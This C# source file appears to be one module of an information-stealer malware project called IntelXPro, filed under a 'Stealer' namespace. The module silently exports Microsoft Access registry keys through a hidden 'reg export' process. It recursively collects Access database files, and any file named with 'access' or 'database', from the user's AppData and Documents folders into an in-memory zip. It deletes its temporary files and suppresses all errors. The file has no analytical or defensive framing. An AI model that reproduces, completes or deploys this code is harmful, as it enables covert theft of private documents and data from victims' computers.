using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Microsoft
{
    internal class Access : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var accessApp = new Counter.CounterApplications { Name = "Microsoft Access" };
                
                CollectAccessRegistry(zip, accessApp);
                CollectAccessFiles(zip, accessApp);
                
                if (accessApp.Files.Count > 0)
                {
                    counter.Applications.Add(accessApp);
                }
            }
            catch { }
        }

        private void CollectAccessRegistry(InMemoryZip zip, Counter.CounterApplications accessApp)
        {
            try
            {
                string[] registryPaths = {
                    @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Access",
                    @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Access\Security\Trusted Locations"
                };

                foreach (string regPath in registryPaths)
                {
                    try
                    {
                        string fileName = $"access_registry_{regPath.Split('\\').Last()}.reg";
                        using (var process = new Process())
                        {
                            process.StartInfo.FileName = "reg";
                            process.StartInfo.Arguments = $"export \"{regPath}\" \"{fileName}\" /y";
                            process.StartInfo.UseShellExecute = false;
                            process.StartInfo.CreateNoWindow = true;
                            process.Start();
                            process.WaitForExit();

                            if (File.Exists(fileName))
                            {
                                string relativePath = Path.Combine("Microsoft", "Access", fileName);
                                zip.AddFile(relativePath, File.ReadAllBytes(fileName));
                                accessApp.Files.Add(relativePath);
                                File.Delete(fileName);
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void CollectAccessFiles(InMemoryZip zip, Counter.CounterApplications accessApp)
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                
                string[] accessPaths = {
                    Path.Combine(appData, "Microsoft", "Access"),
                    Path.Combine(userProfile, "Documents")
                };

                foreach (string accessPath in accessPaths)
                {
                    if (Directory.Exists(accessPath))
                    {
                        CollectAccessFilesFromPath(accessPath, zip, accessApp);
                    }
                }
            }
            catch { }
        }

        private void CollectAccessFilesFromPath(string basePath, InMemoryZip zip, Counter.CounterApplications accessApp)
        {
            try
            {
                foreach (string file in Directory.GetFiles(basePath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        string extension = Path.GetExtension(file).ToLower();
                        string fileName = Path.GetFileName(file).ToLower();
                        
                        if (extension == ".accdb" || extension == ".mdb" || extension == ".accde" || 
                            extension == ".mde" || extension == ".accdt" || extension == ".mdw" ||
                            fileName.Contains("access") || fileName.Contains("database"))
                        {
                            string relativePath = Path.Combine("Microsoft", "Access", 
                                file.Substring(basePath.Length).TrimStart('\\'));
                            
                            zip.AddFile(relativePath, File.ReadAllBytes(file));
                            accessApp.Files.Add(relativePath);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
